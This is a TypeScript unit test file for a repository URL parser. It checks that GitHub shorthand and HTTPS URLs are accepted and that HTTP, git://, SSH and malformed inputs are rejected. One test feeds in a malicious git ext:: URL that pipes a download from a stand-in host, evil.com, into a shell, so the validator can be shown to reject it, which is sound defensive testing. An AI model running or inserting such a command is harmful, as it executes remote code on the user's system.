import { describe, expect, test } from "bun:test";
import { parseRepositoryUrl } from "../src/utils/git";

describe("parseRepositoryUrl", () => {
  test("should parse GitHub shorthand", async () => {
    const result = await parseRepositoryUrl("facebook/react");
    expect(result.url).toBe("https://github.com/facebook/react.git");
    expect(result.name).toBe("react");
  });

  test("should parse HTTPS URLs", async () => {
    const result = await parseRepositoryUrl(
      "https://github.com/facebook/react.git",
    );
    expect(result.url).toBe("https://github.com/facebook/react.git");
    expect(result.name).toBe("react");
  });

  test("should reject HTTP URLs", async () => {
    await expect(
      parseRepositoryUrl("http://github.com/facebook/react.git"),
    ).rejects.toThrow("Only HTTPS");
  });

  test("should reject git:// URLs", async () => {
    await expect(
      parseRepositoryUrl("git://github.com/facebook/react.git"),
    ).rejects.toThrow();
  });

  test("should reject ssh URLs", async () => {
    await expect(
      parseRepositoryUrl("git@github.com:facebook/react.git"),
    ).rejects.toThrow();
  });

  test("should reject malicious git URLs", async () => {
    await expect(
      parseRepositoryUrl("ext::sh -c curl% evil.com|sh"),
    ).rejects.toThrow();
  });

  test("should validate GitHub shorthand format", async () => {
    await expect(parseRepositoryUrl("invalid-shorthand")).rejects.toThrow();
    await expect(parseRepositoryUrl("facebook/react/extra")).rejects.toThrow();
  });

  test("should handle URLs with various valid characters", async () => {
    const result = await parseRepositoryUrl("my-org/my-repo.js");
    expect(result.url).toBe("https://github.com/my-org/my-repo.js.git");
    expect(result.name).toBe("my-repo.js");
  });
});
